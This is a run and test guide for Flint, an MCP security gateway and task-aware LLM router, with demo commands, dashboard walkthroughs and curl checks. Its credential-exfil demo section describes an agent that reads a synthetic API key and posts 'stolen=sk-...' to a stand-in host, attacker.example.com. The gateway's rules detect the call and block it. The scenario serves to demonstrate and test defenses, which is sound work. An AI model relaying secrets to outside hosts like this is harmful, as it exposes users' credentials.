# Flint Dashboard — Run & Test Guide

This document covers how to run the Flint stack end-to-end. Two demos:
1. **MCP gateway** (`make demo`) — Flint as an inline MCP security firewall.
2. **OpenRouter router** (`make demo-router`) — Flint as a task-aware LLM router.

Both share the same engine, audit format, control plane, and dashboard.
See `PITCH.md` for the pitch summary; `devlogs/001-architecture.md` and
`devlogs/011-router-architecture.md` for the full specs.

---

## 1. What you get

| Component | Process | Port | Purpose |
|---|---|---|---|
| Engine | (in-process) | — | Pure policy + behavioral analysis (`engine/`) |
| MCP gateway | `flint-gateway` | stdio + `:7476` | Inline MCP proxy with RBAC + audit |
| **LLM router** | `flint-router` | `:7478` + `:7479` | OpenAI-compatible router that picks a model via OpenRouter |
| Control plane | `flint-control` | `:7475` | REST + WebSocket API; tails both audit files |
| Dashboard UI | `vite` | `:5173` (dev) | React app — 5 Flint screens + 2 router screens |
| Demo drivers | `node` | — | `scripts/sample_agent.mjs` (MCP) · `scripts/router-workload.mjs` (router) · `scripts/exfil_agent.mjs` + `scripts/vulnerable-mcp.mjs` (credential-exfil) |

---

## 2. Prerequisites

- Go 1.21+
- Node 18+ / npm 9+
- macOS or Linux (signal handling + fsnotify path)
- Internet (first MCP run downloads `@modelcontextprotocol/server-everything` via npx)
- **For the router demo:** an OpenRouter API key in `.env.local`:
  ```bash
  echo 'OPENROUTER_API_KEY=sk-or-v1-...' > .env.local
  ```
  The file is gitignored. Free-tier keys work; paid models are accessible.

---

## 3. Run the MCP gateway demo

```bash
make demo
```

This:
1. Builds the gateway and control plane binaries (Go).
2. Clears the audit log (`flint-audit.jsonl`).
3. Starts the control plane on `:7475`.
4. Starts the gateway on `stdio + :7476`, with `npx server-everything` upstream
   and `scripts/sample_agent.mjs` piping JSON-RPC into its stdin.
5. Starts the UI dev server on `:5173`.
6. Opens your default browser to `http://127.0.0.1:5173`.

`Ctrl-C` stops everything.

Logs are written to `.demo-{control,gateway,ui}.log` in the repo root.

---

## 4. What to look for in the dashboard

The sample agent fires a scripted sequence of calls — some allowed, some
denied by deny rules, some denied for `no_matching_rule`.

### Connections (`/`)
- Card for the `everything` upstream MCP server.
- Status: `connected` once the gateway has called the sidecar in the last 30s.
- Tool count: 9 (from `tools.demo.yaml`).
- P50 latency: real values from successful tool calls.

### Sessions / Live (`/sessions`)
- The decision feed updates in real time as `sample_agent.mjs` fires calls.
- Allow rows are green-bordered. Deny rows are red-tinted.
- Click a row to see the full `DecisionRow` JSON (matched role, rule name,
  constraint, evaluated scopes, latency, payload excerpt).
- You should see rows like:
  - `echo` → allowed (matched_rule_name: "Echo and math")
  - `printEnv` → denied (reason: `explicit_deny`, rule: "Block environment disclosure")
  - `sampleLLM` → denied (reason: `explicit_deny`, rule: "Block expensive sampling")
  - `unknownDangerousTool` → denied (reason: `no_matching_rule`)

### Agents (`/agents`)
- Three agents from `bindings.demo.yaml`: `support-bot`, `code-agent`, `locked-down`.
- `support-bot` is the active demo agent — has 3 recent denials.
- Effective Permissions table shows every tool with allow/deny derivation,
  including which role granted (or denied) it.

### Connection detail (`/connections/everything`)
- Tools tab: every tool from `tools.demo.yaml` with classification badge.
- Activity tab: filtered decisions for this upstream.

### Roles editor (`/roles`)
- Pick `demo-strict-allowlist`. Add a resource (e.g. `getTinyImage`). Save.
- Watch the network tab: `PUT /api/v1/roles/demo-strict-allowlist` returns 200.
- The YAML on disk (`config/roles.demo.yaml`) is updated.
- The gateway logs `policy reloaded`.
- Future calls to the changed tool reflect the new rule.

---

## 4b. Run the OpenRouter router demo

```bash
make demo-router
```

This:
1. Builds the router and control plane binaries (Go).
2. Clears `router-audit.jsonl`.
3. Starts control plane on `:7475`, router on `:7478` (+ sidecar on `:7479`).
4. Starts the UI dev server on `:5173`.
5. Fires `scripts/router-workload.mjs` — 13 mixed prompts (classification, code,
   summarization, RAG, conversation, vision-hint, reasoning, tool-use).
6. Opens your browser to `http://127.0.0.1:5173/router/live`.

`Ctrl-C` stops everything. The workload takes ~45 seconds total and costs
about **$0.015** end-to-end (versus ~$0.023 if every call had gone to
`openai/gpt-4o` — visible as a 38% savings line on the dashboard).

### What to look for on the dashboard

#### Router Live (`/router/live`)
- Top strip: cumulative totals — total calls, total spent, baseline counterfactual, savings $, savings %.
- Live feed: each row shows the classifier's task tag (color-coded), the matched policy rule, the chosen target model, latency, and a strikethrough of the baseline cost vs. actual cost.
- Click a row → drawer with the full `RoutingDecision` JSON: classifier reasoning, classifier model + cost + latency, forward model + cost + latency, token counts.
- You should see calls split across at least three models — `openai/gpt-4o-mini`, `anthropic/claude-haiku-4.5`, and `anthropic/claude-sonnet-4.6` — depending on which rule the classifier triggered.

#### Router Routes (`/router/routes`)
- Left pane: the policy YAML in a monospace editor.
- Right pane: rule-by-rule visual breakdown of the last-saved policy.
- Edit the YAML, click Save → the file is atomically written, the router hot-reloads, and the next request uses the new policy. No restart.

#### Try it: edit a route, watch it take effect

In the Router Routes editor, change the `Cheap classification` target from
`openai/gpt-4o-mini` to `anthropic/claude-haiku-4.5`. Save. Now run another
classification call (`make demo-router` again, or curl directly — see §5).
The new classification routes to Haiku, visible in the live feed within ~3
seconds of the save.

---

## 4c. Run the credential-exfil demo

```bash
make demo-exfil
```

Or, to run in observe-only mode (findings fire but the gateway passes everything through):

```bash
make demo-exfil ARGS=--observe-only
```

This:
1. Builds the gateway and control plane binaries (Go).
2. Clears the audit log (`flint-audit.jsonl`).
3. Starts the control plane on `:7475`.
4. Starts the gateway with `scripts/vulnerable-mcp.mjs` as the upstream MCP server and `scripts/exfil_agent.mjs` driving the attack sequence into the gateway's stdin.
5. Starts the UI dev server on `:5173`.
6. Opens your default browser to `http://127.0.0.1:5173/sessions`.

`Ctrl-C` stops everything.

### What you'll see

The attack runs a scripted two-step exfil sequence. In default enforce mode you will see **3 audit rows total** in the dashboard.

1. **`read_config{name: "prod_settings"}`** — produces 2 rows:
   - **Request row** (allow): RBAC passes (the `exfil-demo-allowlist` role is intentionally permissive; behavioral rules carry the block).
   - **Response row** (observed): the upstream returns a synthetic OpenAI key (`sk-AAAA...`). The `credential_exposure` rule fires (action: `warn`, score: 60). The row shows an `observed` badge with a `credential_exposure · warn` chip.
2. **`post_webhook{url: "attacker.example.com", body: "stolen=sk-..."}`** — produces 1 row (enforce mode):
   - **Request row** (blocked): the `secret_relay` rule fires (action: `terminate`, score: 90) because the relayed token matches the key indexed from the prior response. The `restricted_read_external_write` rule also fires (action: `pause`). The gateway blocks the request before it reaches the upstream — no response row is written. The row shows a `blocked` badge with `secret_relay · terminate` and `restricted_read_external_write · pause` chips. Session risk score lands at 230, disposition `terminate`.

### Observe vs enforce

- **Default (enforce mode):** three audit rows — `read_config` request (allow) → `read_config` response (observed, `credential_exposure` fires) → `post_webhook` request (blocked, `secret_relay` + `restricted_read_external_write` fire). No fourth row because the `post_webhook` request is blocked before the upstream receives it, so no response is written.
- **Observe-only (`--observe-only`):** four audit rows — same first three, but `post_webhook` is `observed` instead of `blocked`, the call reaches the upstream and returns, and a fourth row for the `post_webhook` response is written. The upstream logs `"posted to attacker.example.com"`. The dashboard surfaces all findings identically in both modes.

Use case: run Flint in shadow mode first (`--observe-only`) to baseline findings without changing agent behavior, then flip to enforce once confident. The audit trail is identical in both modes.

### Regression gate

To run the full labeled corpus through the engine and verify precision/recall:

```bash
go run ./cmd/replay --corpus corpus/
```

All 12 corpus traces must exit 0 (precision ≥ 0.95, recall ≥ 0.80 per rule).

---

## 5. Test it manually with curl

Stack must be running. Try these.

```bash
# ----- MCP gateway demo (stack from `make demo`) -----------------------------

# Health
curl http://127.0.0.1:7475/healthz
curl http://127.0.0.1:7476/healthz                                  # gateway sidecar

# All agents (from policy + activity)
curl http://127.0.0.1:7475/api/v1/agents | jq

# Effective permissions for support-bot
curl http://127.0.0.1:7475/api/v1/agents/support-bot | jq '.effective_permissions'

# Recent denials for support-bot
curl http://127.0.0.1:7475/api/v1/agents/support-bot | jq '.recent_denials'

# Raw audit
tail -5 flint-audit.jsonl | jq

# Live WS stream (needs wscat or node)
npx -y wscat -c ws://127.0.0.1:7475/api/v1/stream

# Trigger a hot reload via PUT
curl -X PUT http://127.0.0.1:7475/api/v1/roles/demo-strict-allowlist \
  -H 'Content-Type: application/json' \
  -d '{"name":"demo-strict-allowlist","rules":[{"name":"Echo, add, image","effect":"allow","resources":["echo","add","getTinyImage"],"verbs":["invoke"]}]}'

# ----- Router demo (stack from `make demo-router`) ---------------------------

# Router sidecar healthz
curl http://127.0.0.1:7479/healthz

# Send a chat completion (OpenAI-compatible — drop-in for OpenRouter's URL)
curl -X POST http://127.0.0.1:7478/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{
    "model": "auto",
    "max_tokens": 80,
    "messages": [
      {"role": "user", "content": "Write a Python LRU cache class with O(1) operations."}
    ]
  }' | jq

# Router stats (cost savings, per-task breakdown)
curl http://127.0.0.1:7475/api/v1/router/stats?window=session | jq

# Most recent routing decisions
curl "http://127.0.0.1:7475/api/v1/router/decisions?limit=5" | jq '.items[] | {ts, target_model, total_cost_usd, savings_usd}'

# Live WS stream for router decisions
npx -y wscat -c ws://127.0.0.1:7475/api/v1/router/stream

# Get the policy (as JSON view; add /raw for the YAML)
curl http://127.0.0.1:7475/api/v1/router/policy | jq
curl http://127.0.0.1:7475/api/v1/router/policy/raw

# Hot-reload the policy by editing config/router-policy.yaml directly + sending the YAML via PUT
curl -X PUT http://127.0.0.1:7475/api/v1/router/policy \
  -H 'Content-Type: text/yaml' \
  --data-binary @config/router-policy.yaml | jq
```

---

## 6. Run the unit tests

```bash
make test                                  # everything
make test-engine                           # just engine/authz
go test ./engine/routing/... -race         # routing policy + evaluator
go test ./cmd/control/... -race            # control plane (gateway + router)
```

Engine tests: all 26+ authz tests + 15+ routing tests pass clean, including:
- Deny rules with "deny wins globally" precedence
- Server selectors (`server:github`)
- Atomic policy hot reload
- Routing evaluator: first-match-wins, capability filters, complexity ranges, fallback chains.

---

## 7. Where things live

```
flint/
├── engine/                # Pure RBAC + behavioral engine (no I/O)
│   ├── authz/             # LoadPolicy, Evaluate, CanDiscover, PolicyHolder
│   ├── lineage/ rules/ risk/ fingerprint/  # behavioral
│   └── session/           # types
├── cmd/
│   ├── gateway/           # Inline MCP proxy; structured logs, audit JSONL, sidecar
│   ├── control/           # HTTP + WS server (the UI's only backend dependency)
│   └── replay/            # Existing trace replay
├── pkg/api/types.go       # Wire schema — shared by gateway + control plane + UI
├── ui/                    # Vite + React + TS dashboard
│   └── src/
│       ├── api/           # types.ts (mirrors pkg/api/types.go), client, ws, mock
│       ├── routes/        # 5 screens
│       └── components/    # shadcn-style + custom
├── config/
│   ├── roles.yaml         # original (engine tests)
│   ├── bindings.yaml      # original
│   ├── roles.demo.yaml    # demo configs (aligned to server-everything)
│   └── bindings.demo.yaml
├── tools.yaml             # original tool registry
├── tools.demo.yaml        # demo registry
├── scripts/
│   ├── demo.sh            # one-shot launcher
│   ├── sample_agent.mjs   # scripted JSON-RPC producer
│   └── wait-port.sh
├── Makefile
└── devlogs/               # Build log: planner, implementers, reviewers
```

---

## 8. Toggling mock mode in the UI

The UI defaults to talking to the real control plane. To work offline with
seeded mock data:

```bash
echo 'VITE_USE_MOCK=true' > ui/.env.local
cd ui && npm run dev
```

To switch back, delete `.env.local`.

---

## 9. Stop the demo

```bash
make kill
```

or `Ctrl-C` in the terminal running `make demo`.

---

## 10. Known limitations (this build)

**MCP gateway side:**
- Single upstream MCP per gateway (multi-upstream comes later).
- No authentication on the control plane (localhost-only).
- No mobile breakpoints in the UI.
- `payload_excerpt` is not redacted for `payload_class: restricted` tools — they appear in the audit log as cleartext for now.
- Predicate constraints (`!=`, glob `**`, OR via `|`) not yet supported — only `sql_intent` and `path_prefix` allowlists.

**Router side:**
- No streaming responses — `"stream": true` returns 501. Pipeline is designed to allow it; ~half-day to add.
- No semantic / embedding cache — every call hits OpenRouter. Adding this would compound the savings significantly.
- Single-tenant — no per-user / per-team policies. Localhost-only.
- No authentication on the router itself (the key is server-side; client trust is implicit).
- Classifier adds ~$0.0001 and ~1.3s of overhead per call. For very high-volume cheap calls, the overhead can exceed the savings — visible on the dashboard via per-decision negative-savings rows.

---

## 11. Devlogs (for understanding what was built)

**MCP gateway build:**
- `000-orchestration.md` — Flint orchestrator's notes
- `001-architecture.md` — full spec (contracts A/B/C)
- `002-engine.md` · `003-gateway.md` · `004-control.md` · `005-ui.md`
- `006-phase1-gateway.md` · `007-phase1-control.md` · `008-phase1-ui.md` · `009-phase2.md`

**OpenRouter router build:**
- `010-router-orchestration.md` — router orchestrator's notes
- `011-router-architecture.md` — router spec
- `012-router.md` (binary + `engine/routing`) · `013-control-router.md` (control plane) · `014-router-ui.md` (UI)
- `015-phase1-router-combined.md` — combined review
